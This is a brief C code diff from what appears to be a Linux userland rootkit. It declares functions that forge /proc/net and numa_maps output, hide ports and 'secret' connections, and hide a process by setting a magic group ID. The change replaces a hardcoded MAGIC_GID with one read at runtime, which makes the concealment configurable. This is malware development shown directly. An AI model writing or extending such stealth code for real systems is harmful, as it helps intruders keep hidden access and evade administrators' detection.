@@ -28,14 +28,14 @@ FILE *forge_numamaps(const char *pathname);
 #endif
 
 #ifdef HIDE_PORTS
-// this is replaced by the hideports path.
-#define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]
 int is_hidden_port(int port);
 int secret_connection(char line[]);
 int hideport_alive(void);
 FILE *forge_procnet(const char *pathname);
 #include "forge_procnet.c"
 #endif
+
+
 
 void _setgid(gid_t gid){
     hook(CSETGID);
@@ -47,8 +47,9 @@ void hide_self(void){
     return;
 #endif
 
-    if(not_user(0) || getgid() == MAGIC_GID) return;
-    _setgid(MAGIC_GID);
+    gid_t magicgid = readgid();
+    if(not_user(0) || getgid() == magicgid) return;
+    _setgid(magicgid);
 }
 
 void unhide_self(void){
